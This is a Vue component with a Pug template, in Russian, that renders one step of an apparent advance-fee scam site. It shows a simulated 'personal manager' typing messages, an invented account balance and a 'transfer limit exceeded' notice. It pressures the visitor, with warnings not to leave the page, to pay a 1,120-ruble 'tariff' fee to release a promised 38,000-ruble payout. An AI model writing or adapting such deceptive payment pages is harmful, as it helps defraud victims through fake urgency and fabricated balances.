<template lang='pug'>
    .step
        .step__top
            .step__top-left
                span.step__top-icon
                    user-icon(height="140")

            .step__top-right
                .step__top-heading ПРЕВЫШЕН ЛИМИТ ПО СУММЕ ПЕРЕВОДА

                .step__top-desc Не покидайте страницу!!! Если вы закроете данную страницу, сессия будет завершена и Ваш доход утерян

                .step__top-t3 ЛИЧНЫЙ МЕНЕДЖЕР

                .step__top-msg(v-if="!msg.firstShow") Менеджер печатает сообщение

                .step__top-t2
                    p(v-if="msg.firstShow") Я сделал запрос в систему массовых выплат. У вас тариф <span style="color: orange">"Стандарт"</span>. Там переводы не больше <span style="color: orange">3000 рублей</span> в сутки. Поэтому перевод стразу и не прошел, все еще находится в обработке.

                    .step__top-msg(v-if="msg.secondType") Менеджер печатает сообщение

                    p(v-if="msg.secondMsg") Чтобы завершить перевод, увеличьте лимит по сумме перевода, подключив тариф "Максимум". Это стоит всего 1120 рублей. Как только подключите, они сразу отправят вам деньги.

        .step__bot
            .step__bot-header ВЫВОД СРЕДСТВ

            .step__bot-body
                ul.step__bot-balans.list
                    li.step__bot-account
                        span.step__bot-account-bg
                            img(src="~img/images/account-img.svg")

                        span.step__bot-account-title Счет№:

                        span.step__bot-account-value 1773569865 

                    li.step__bot-sum
                        span.step__bot-sum-bg
                            img(src="~img/images/coint-img.svg")

                        span.step__bot-sum-title Баланс счета:

                        span.step__bot-sum-value 37458 руб

                p.step__bot-t1 Статус: <span class="orange"> Ожидается увеличение лимита</span>

                p.step__bot-t2 Денежный перевод отклонен системой массовых выплат. <br />Превышен лимит по сумме перевода. <span class="black">Для завершения <br />перевода, увеличьте ваш лимит</span> по денежным операциям.

                router-link.step__bot-submit.link(:to="{ name: 'fourStep' }") ОПЛАТИТЬ УСЛУГИ МЕНЕДЖЕРА

                .step__bot-footer Сразу после оплаты комиссии, <br />вам будет отправлен перевод в сумме: 38000 руб.
</template>

<script src='./script.js'></script>

<style lang='scss' src='../firstStep/style.scss'></style>